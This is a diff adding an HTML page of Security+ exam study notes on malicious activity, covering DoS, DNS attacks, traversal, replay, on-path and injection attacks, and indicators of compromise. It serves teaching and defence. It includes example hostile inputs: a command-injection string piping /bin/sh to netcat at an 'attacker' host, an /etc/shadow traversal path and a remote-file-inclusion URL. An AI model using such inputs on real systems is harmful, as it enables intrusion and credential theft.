@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Section 18 · Malicious Activity — Interactive Notes</title>
+<style>
+  :root {
+    --bg: #0d1117; --panel: #161b22; --border: #30363d; --text: #e6edf3;
+    --muted: #8b949e; --accent: #f0883e; --accent-dim: rgba(240,136,62,.14);
+    --green: #3fb950; --red: #f85149; --gold: #d29922; --blue: #58a6ff;
+    color-scheme: dark;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: "Segoe UI", system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }
+  .container { width: 100%; max-width: 880px; margin: 0 auto; padding: 22px 16px 90px; }
+  a { color: var(--blue); text-decoration: none; } a:hover { text-decoration: underline; }
+  .topbar { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; margin-bottom: 14px; font-size: 13px; color: var(--muted); }
+  .topbar .grow { flex: 1; }
+  .badge { display: inline-block; background: var(--accent-dim); color: var(--accent); border: 1px solid rgba(240,136,62,.4); border-radius: 999px; padding: 4px 14px; font-size: 12px; }
+  h1 { font-size: 24px; margin: 10px 0 6px; }
+  .sub { color: var(--muted); font-size: 14px; line-height: 1.6; margin-bottom: 18px; }
+  .btn { display: inline-block; background: var(--accent); color: #0d1117; font-weight: 600; font-size: 14px; border: none; border-radius: 8px; padding: 10px 22px; cursor: pointer; transition: filter .15s; }
+  .btn:hover { filter: brightness(1.12); }
+  .btn.ghost { background: transparent; color: var(--text); border: 1px solid var(--border); }
+  
+  .banner { background: var(--accent-dim); border: 1px solid rgba(240,136,62,.35); border-radius: 10px; padding: 14px 16px; font-size: 13.5px; line-height: 1.65; margin-bottom: 16px; }
+  #search { width: 100%; padding: 12px 16px; font-size: 16px; background: var(--panel); border: 1px solid var(--border); border-radius: 10px; color: var(--text); margin-bottom: 16px; }
+  #search:focus { outline: none; border-color: var(--accent); }
+  details.topic { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; margin-bottom: 12px; overflow: hidden; }
+  details.topic.reviewed { border-color: rgba(63,185,80,.5); }
+  details.topic summary { display: flex; align-items: center; gap: 10px; padding: 14px 16px; cursor: pointer; font-weight: 600; font-size: 15px; list-style: none; user-select: none; }
+  details.topic summary::-webkit-details-marker { display: none; }
+  details.topic summary::before { content: '\25B8'; color: var(--accent); transition: transform .15s; flex: 0 0 auto; }
+  details.topic[open] summary::before { transform: rotate(90deg); }
+  .t-name { flex: 1; }
+  .t-review { flex: 0 0 auto; background: transparent; border: 1px solid var(--border); color: var(--muted); border-radius: 999px; padding: 4px 12px; font-size: 12px; cursor: pointer; min-height: 30px; }
+  .t-review.done { border-color: var(--green); color: var(--green); }
+  .topic-body { padding: 2px 18px 18px 34px; font-size: 14.5px; line-height: 1.7; color: #c9d1d9; }
+  .topic-body p { margin: 8px 0; }
+  .topic-body h2 { font-size: 17px; margin: 14px 0 6px; color: var(--text); }
+  .topic-body h3 { font-size: 15px; margin: 14px 0 4px; color: var(--gold); }
+  .topic-body strong { color: var(--text); }
+  .topic-body code { background: #2d333b; padding: 1px 6px; border-radius: 4px; font-size: 13px; }
+  .topic-body .mdlist { margin: 8px 0 8px 18px; }
+  .topic-body .mdlist .mdlist, .topic-body .mdlist ul { margin-left: 16px; }
+  .topic-body li { margin: 4px 0; }
+  .tblwrap { overflow-x: auto; margin: 10px 0; }
+  .tblwrap table { border-collapse: collapse; width: 100%; font-size: 13.5px; }
+  .tblwrap th { text-align: left; color: var(--gold); padding: 8px 10px; border-bottom: 1px solid var(--border); white-space: nowrap; }
+  .tblwrap td { padding: 8px 10px; border-bottom: 1px solid #21262e; vertical-align: top; }
+  .pagenav { display: flex; justify-content: space-between; gap: 10px; flex-wrap: wrap; margin-top: 28px; }
+  .pagenav .btn { font-size: 13px; padding: 10px 14px; margin: 0; max-width: 48%; }
+  @media (max-width: 600px) { .topic-body { padding-left: 18px; } details.topic summary { padding: 14px 12px; font-size: 14px; } }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <div class="topbar">
+    <a href="../library.html">&larr; Full library</a>
+    <span class="grow"></span>
+    <span id="prog" class="badge"></span>
+  </div>
+  <h1>Section 18 · Malicious Activity &mdash; Interactive Notes</h1>
+  <p class="sub">Tap a topic to expand it. Search filters topics instantly. Mark topics as reviewed to track your reading progress &mdash; it is saved on this device.</p>
+  
+  <input id="search" type="search" placeholder="Search these notes&hellip;" autocomplete="off">
+  <div id="cards"><p class="doc-title">Section 19 — Malicious Activity (SY0-701 Study Notes)</p>
+<p>Objective 2.4: &quot;Given a scenario, analyze indicators of malicious activity.&quot; This is the second half of the heaviest exam domain — expect &quot;identify the attack/IoC from a scenario or log&quot; questions throughout.</p>
+<details class="topic" open><summary><span class="t-name">177–178 — Denial of Service &amp; Distributed Denial of Service</span><span class="t-state"></span><button class="t-review" onclick="toggleReview(event,this)" title="Mark topic as reviewed">&nbsp;</button></summary><div class="topic-body">
+<p>DoS is a <strong>category</strong>, not one attack — anything that makes a system's resources unavailable to legitimate users.</p>
+<ul class="mdlist"><li><strong>Flood attack</strong>: send more packets than the target can handle.</li><ul><li><strong>Ping flood</strong>: floods with ICMP echo requests. Common defense: block/drop echo replies at the firewall → attacker gets timeouts.</li><li><strong>SYN flood</strong>: send many SYN packets (often from spoofed IPs), never complete the 3-way handshake → server holds resources for half-open connections until exhausted. Defenses: <strong>flood guards</strong> (dedicated devices or router/firewall feature), <strong>timeouts on half-open requests</strong> (10/15/30 s), <strong>IPS detection</strong>.</li></ul><li><strong>PDoS (permanent DoS)</strong>: exploits a flaw to <strong>re-flash firmware</strong> and permanently brick a device; needs a full firmware reload — reboot does not help.</li><li><strong>Fork bomb</strong>: spawns processes that fork exponentially, consuming all CPU. <strong>Not a worm</strong> — doesn't infect programs or spread over the network; only consumes resources on one machine.</li><li><strong>DDoS</strong>: hundreds/thousands of machines (zombies/bots in a <strong>botnet</strong>) attack one target simultaneously. Record: GitHub March 2018, ~1.35 Tbps, down ~5 minutes.</li><li><strong>DNS amplification</strong>: spoof the victim's IP in small DNS queries to open resolvers; the large responses flood the victim.</li><li><strong>Defenses</strong>: <strong>blackholing/sinkholing</strong> (route attacker IPs to a null interface — temporary, attacker moves IPs); IPS (only for small attacks); <strong>elastic/scaling cloud</strong> (works but expensive); specialized providers — <strong>Cloudflare, Akamai</strong> (WAF filtering + content distribution, absorb the attack).</li></ul>
+</div></details>
+<details class="topic" open><summary><span class="t-name">179 — DNS Attacks</span><span class="t-state"></span><button class="t-review" onclick="toggleReview(event,this)" title="Mark topic as reviewed">&nbsp;</button></summary><div class="topic-body">
+<div class="tblwrap"><table><thead><tr><th>Attack</th><th>How it works</th><th>Mitigation</th></tr></thead><tbody><tr><td><strong>DNS cache poisoning (spoofing)</strong></td><td>Corrupt a resolver's cache with false records → users redirected to attacker IPs (fake banking site)</td><td><strong>DNSSEC</strong> (digital signatures on DNS data), secure configs/firewalls</td></tr><tr><td><strong>DNS amplification</strong></td><td>Spoofed small queries → open DNS servers send big responses to victim</td><td>Limit/rate-limit DNS response sizes</td></tr><tr><td><strong>DNS tunneling</strong></td><td>Encapsulate HTTP/SSH data inside DNS (port 53) to bypass firewalls; used for <strong>C2 and exfiltration</strong></td><td>Monitor/analyze DNS logs for unusual patterns</td></tr><tr><td><strong>Domain hijacking (theft)</strong></td><td>Change domain registration without the registrant's permission → site control lost</td><td>Secure registrar account, <strong>registry lock services</strong></td></tr><tr><td><strong>DNS zone transfer attack</strong></td><td>Attacker pretends to be an authorized system, requests a copy of the whole zone (all records) → recon for future attacks</td><td>Restrict zone transfers to authorized servers</td></tr></tbody></table></div>
+</div></details>
+<details class="topic" open><summary><span class="t-name">180 — Directory Traversal (Path Traversal)</span><span class="t-state"></span><button class="t-review" onclick="toggleReview(event,this)" title="Mark topic as reviewed">&nbsp;</button></summary><div class="topic-body">
+<ul class="mdlist"><li>Injection attack giving access to files outside the <strong>web document root</strong> via <code>../</code> (Linux/Mac, <code>..\\</code> on Windows — IIS often accepts both).</li><li>Example: <code>site.com/../../../../etc/shadow</code>.</li><li>Can be <strong>URL-encoded to evade filters</strong>: <code>%2e%2e%2f</code> = <code>../</code>.</li><li><strong>File inclusion</strong>:</li><ul><li><strong>Remote file inclusion (RFI)</strong>: app loads a script from a remote URL, e.g. <code>?user=http://evil/malicious.php</code>.</li><li><strong>Local file inclusion (LFI)</strong>: includes a file already on the server, e.g. <code>../../Windows/system32/cmd.exe</code> — often with a <strong><code>%00</code> null byte</strong> to truncate appended extensions (e.g., the forced <code>.php</code>).</li></ul><li><strong>Exam tip</strong>: see <code>../</code> in a proxy log → <strong>directory traversal or local file inclusion</strong>. Input validation prevents it.</li></ul>
+</div></details>
+<details class="topic" open><summary><span class="t-name">181 — Execution &amp; Escalation Attacks</span><span class="t-state"></span><button class="t-review" onclick="toggleReview(event,this)" title="Mark topic as reviewed">&nbsp;</button></summary><div class="topic-body">
+<ul class="mdlist"><li><strong>Arbitrary code execution</strong>: run attacker's code locally on the target.</li><li><strong>Remote code execution (RCE)</strong>: a type of arbitrary code execution done <strong>over the network</strong> — &quot;if I can touch your machine and load my software, that's arbitrary; over the internet, that's remote.&quot;</li><li><strong>Privilege escalation</strong>: accessing/modifying resources you're not entitled to; goal = admin/root/domain admin.</li><ul><li><strong>Vertical</strong>: normal user → higher level (user → admin/root). The classic image.</li><li><strong>Horizontal</strong>: same level, but someone else's resources (reading George's files on a share, running as George).</li></ul><li>Injected code inherits the <strong>privileges of the process it runs in</strong> — system-service compromise = SYSTEM-level code execution.</li><li><strong>Rootkits</strong>: malware that modifies system files (often <strong>kernel level</strong>) to hide its presence; enables stealth, persistence across reboots/logoffs, and installing more malware.</li><ul><li><strong>Protection rings</strong>: ring 0 = kernel (most privileged); drivers ring 1–2; applications ring 3.</li><li><strong>Kernel-mode rootkit</strong> (ring 0): complete control — the most dangerous.</li><li><strong>User-mode rootkit</strong>: admin-level but relies on OS features (registry, Task Scheduler) for persistence.</li></ul></ul>
+</div></details>
+<details class="topic" open><summary><span class="t-name">182 — Replay Attacks</span><span class="t-state"></span><button class="t-review" onclick="toggleReview(event,this)" title="Mark topic as reviewed">&nbsp;</button></summary><div class="topic-body">
+<ul class="mdlist"><li><strong>Fraudulent rebroadcast/repetition/delay of a valid data transmission.</strong> Intercept → analyze → retransmit later (vs. session hijacking, where the attacker modifies live traffic in real time).</li><li>Example: capture a bank login session, replay it later to log in as the victim; capture shopping-site credentials and use them, or change the password to lock the victim out.</li><li><strong>Mitigations</strong>: <strong>session tokens</strong> (unique per session), <strong>MFA</strong> (one-time codes that rotate every 30–60 s make replayed logins worthless), modern protocols — <strong>WPA3</strong>.</li></ul>
+</div></details>
+<details class="topic" open><summary><span class="t-name">183 — Session Hijacking</span><span class="t-state"></span><button class="t-review" onclick="toggleReview(event,this)" title="Mark topic as reviewed">&nbsp;</button></summary><div class="topic-body">
+<ul class="mdlist"><li>Spoofing attack: attacker takes over a valid session — by spoofing the original host's IP or <strong>stealing/modifying session cookies</strong>.</li><li>HTTP is <strong>stateless</strong> → state kept in cookies or server-side DB.</li><ul><li><strong>Session cookie</strong> = non-persistent, in-memory, deleted when the browser closes.</li><li><strong>Persistent cookie</strong> = stored in browser cache until expiry/deletion.</li><li>Cookies carrying confidential data must be <strong>encrypted</strong>.</li></ul><li><strong>Session prediction</strong>: guessing a predictable session token. Tokens must be truly random, non-predictable, reveal nothing about the client, <strong>one-time use per session</strong>.</li><li><strong>Cookie poisoning</strong>: modifying a cookie after it was issued to exploit the web app. Defenses: input validation, <strong>encryption in transit and storage</strong>, delete cookies from cache when the session ends, keep them short-lived.</li></ul>
+</div></details>
+<details class="topic" open><summary><span class="t-name">184 — On-Path Attacks (Man-in-the-Middle)</span><span class="t-state"></span><button class="t-review" onclick="toggleReview(event,this)" title="Mark topic as reviewed">&nbsp;</button></summary><div class="topic-body">
+<ul class="mdlist"><li>Attacker places their workstation <strong>logically between two hosts</strong> to capture, monitor, and relay traffic transparently.</li><li>Enablers: <strong>ARP poisoning, DNS poisoning, rogue wireless AP, rogue hover switch</strong>.</li><li><strong>Replay</strong> (from the on-path position): capture valid data and repeat it immediately or later — e.g., replay a captured wireless auth handshake to be treated as authenticated.</li><li><strong>Relay</strong>: attacker becomes a proxy between the two hosts — can read, capture (credentials, bank balances), or <strong>modify</strong> traffic before passing it on.</li><li><strong>Encryption is the big obstacle</strong> → attacker counter-techniques:</li><ul><li><strong>SSL stripping</strong>: downgrade/trick the user from HTTPS to <strong>HTTP</strong> so traffic is plaintext.</li><li><strong>Downgrade attack</strong>: force client/server to abandon high security for a <strong>lower but backwards-compatible</strong> mode (e.g., negotiate SSL 2.0 instead of TLS 1.3; the lock icon still shows). Works against any negotiated protection — Wi-Fi, VPNs, TLS.</li></ul></ul>
+</div></details>
+<details class="topic" open><summary><span class="t-name">185 — Injection Attacks (LDAP, Command, Process)</span><span class="t-state"></span><button class="t-review" onclick="toggleReview(event,this)" title="Mark topic as reviewed">&nbsp;</button></summary><div class="topic-body">
+<ul class="mdlist"><li><strong>LDAP injection</strong>: fabricate LDAP statements via user input — e.g., entering <code>*</code> (wildcard) as the username dumps all users from the directory. Targets auth/directories. Prevention: <strong>input validation/sanitization</strong> (same as SQLi/XMLi).</li><li><strong>Command injection</strong>: execute arbitrary <strong>shell commands</strong> through a vulnerable web app — e.g., a &quot;ping this host&quot; form field where <code>host &amp;&amp; command</code> runs the second command too (<code>&amp;&amp; hostname</code>, or <code>&amp;&amp; /bin/sh | nc attacker 443</code> for a reverse shell). Prevention: <strong>input validation</strong> — accept only the expected format (IP/hostname), ignore everything else.</li><li><strong>Process injection</strong>: run arbitrary code <strong>inside the address space of another live process</strong> → inherits its memory, resources, and possibly elevated privileges, and <strong>evades detection</strong> by hiding under a legitimate process. Techniques: DLL injection, thread-execution hijacking, <strong>process hollowing</strong>, <strong>process doppelganging</strong>, asynchronous procedure calls, portable executable injection.</li><ul><li>Mitigations: endpoint security blocking common attack-behavior sequences, <strong>kernel security modules</strong>, <strong>least privilege</strong>.</li></ul></ul>
+</div></details>
+<details class="topic" open><summary><span class="t-name">186 — Indicators of Compromise (IoCs)</span><span class="t-state"></span><button class="t-review" onclick="toggleReview(event,this)" title="Mark topic as reviewed">&nbsp;</button></summary><div class="topic-body">
+<p>Forensic data signaling potentially malicious activity — hints, not proof; investigate before concluding breach.</p>
+<div class="tblwrap"><table><thead><tr><th>IoC</th><th>What it looks like</th></tr></thead><tbody><tr><td><strong>Account lockouts</strong></td><td>Repeated failed logins → brute-force attempt (or a mistyping user — balance security vs. usability)</td></tr><tr><td><strong>Concurrent session usage</strong></td><td>One account active from two places/devices at once — possible account sharing by attacker</td></tr><tr><td><strong>Blocked content</strong></td><td>Repeated attempts to reach/download blocked (malicious or sensitive) content</td></tr><tr><td><strong>Impossible travel</strong></td><td>Logins from distant locations within a time window that physical travel can't bridge (NY then London in an hour)</td></tr><tr><td><strong>Resource consumption</strong></td><td>Sudden CPU/memory/bandwidth/GPU spikes — malware, DDoS, or <strong>crypto-mining zombie</strong> (e.g., 90% GPU while browsing)</td></tr><tr><td><strong>Resource inaccessibility</strong></td><td>Files/databases suddenly unreachable — classic <strong>ransomware</strong> sign (plus ransom note)</td></tr><tr><td><strong>Out-of-cycle logging</strong></td><td>Activity at 3 AM / weekends when nobody works — attacker hiding in off-hours</td></tr><tr><td><strong>Missing logs</strong></td><td>Gaps in logs — attacker deleted them to cover tracks</td></tr><tr><td><strong>Publicized breach</strong></td><td>Attacker posts/discloses the hack (forums, social media, defaced website)</td></tr></tbody></table></div>
+<h3>High-yield rapid-fire list</h3>
+<ul class="mdlist"><li>Half-open TCP connections → <strong>SYN flood</strong> → flood guards, short timeouts, IPS.</li><li>Bricked firmware → <strong>PDoS</strong>. Forking processes → <strong>fork bomb</strong> (not a worm).</li><li><code>../</code> in proxy logs → <strong>directory traversal / LFI</strong>; <code>%2e%2e%2f</code> = encoded version; <code>%00</code> = null-byte truncation.</li><li>Small query, big spoofed response → <strong>DNS amplification</strong>. Malware in DNS port-53 traffic → <strong>DNS tunneling</strong>.</li><li>Poisoned resolver cache → redirect to fake site → <strong>DNS cache poisoning</strong> → <strong>DNSSEC</strong>.</li><li>Wrong domain registration → <strong>domain hijacking</strong> → registry lock. Full zone copy request → <strong>zone transfer attack</strong>.</li><li>User → admin = <strong>vertical</strong> escalation; George's files = <strong>horizontal</strong>.</li><li>Ring 0 rootkit = <strong>kernel mode</strong> = most dangerous; registry/Task Scheduler persistence = <strong>user mode</strong>.</li><li>Re-broadcasting a captured valid transmission → <strong>replay</strong> → session tokens + MFA + WPA3.</li><li>HTTPS forced to HTTP → <strong>SSL stripping</strong>; TLS 1.3 → SSL 2.0 negotiation → <strong>downgrade attack</strong>.</li><li><code>*}</code> in LDAP search → <strong>LDAP injection</strong>. <code>&amp;&amp;</code> in a ping form → <strong>command injection</strong>. Code under a legit process → <strong>process injection</strong> (hollowing/doppelganging).</li><li>NY→London in 1 hour → <strong>impossible travel</strong>. 90% GPU at idle → crypto-miner. Missing log gap → attacker covering tracks.</li></ul>
+</div></details></div>
+  <p id="noresults" style="display:none;color:var(--muted);padding:24px 0;text-align:center;">No topics match your search.</p>
+  <div class="pagenav"><a class="btn ghost" href="vulnerabilities-and-attacks-study-notes.html">&larr; Prev: Section 17 · Vulnerabilities and Attacks</a> <a class="btn ghost" href="hardening-study-notes.html">Next &rarr;: Section 19 · Hardening</a></div>
+  <script>
+    var SLUG = "malicious-activity";
+    var TOTAL = 9;
+    var KEY = 'secplus_review_v1';
+    function loadState(){ try { return JSON.parse(localStorage.getItem(KEY) || '{}'); } catch(e){ return {}; } }
+    function myTopics(){ var s = loadState(); return s[SLUG] || []; }
+    function saveTopics(arr){ var s = loadState(); s[SLUG] = arr; localStorage.setItem(KEY, JSON.stringify(s)); }
+    function paint(){
+      var done = myTopics();
+      document.querySelectorAll('details.topic').forEach(function(d, i){
+        var btn = d.querySelector('.t-review');
+        var isDone = done.indexOf(i) !== -1;
+        btn.textContent = isDone ? '\u2713 Reviewed' : 'Mark reviewed';
+        btn.classList.toggle('done', isDone);
+        d.classList.toggle('reviewed', isDone);
+      });
+      var el = document.getElementById('prog');
+      el.textContent = done.length + ' / ' + TOTAL + ' topics reviewed';
+      el.style.borderColor = done.length === TOTAL ? 'var(--green)' : '';
+      el.style.color = done.length === TOTAL ? 'var(--green)' : '';
+    }
+    function toggleReview(ev, btn){
+      ev.preventDefault(); ev.stopPropagation();
+      var card = btn.closest('details.topic');
+      var i = Array.prototype.indexOf.call(document.querySelectorAll('details.topic'), card);
+      var done = myTopics();
+      var at = done.indexOf(i);
+      if (at === -1) done.push(i); else done.splice(at, 1);
+      saveTopics(done); paint();
+    }
+    document.getElementById('search').addEventListener('input', function(){
+      var v = this.value.trim().toLowerCase(); var shown = 0;
+      document.querySelectorAll('details.topic').forEach(function(d){
+        var hit = !v || d.textContent.toLowerCase().indexOf(v) !== -1;
+        d.style.display = hit ? '' : 'none';
+        if (hit) shown++;
+      });
+      document.getElementById('noresults').style.display = shown ? 'none' : '';
+    });
+    paint();
+  </script>
+</div>
+</body>
+</html>
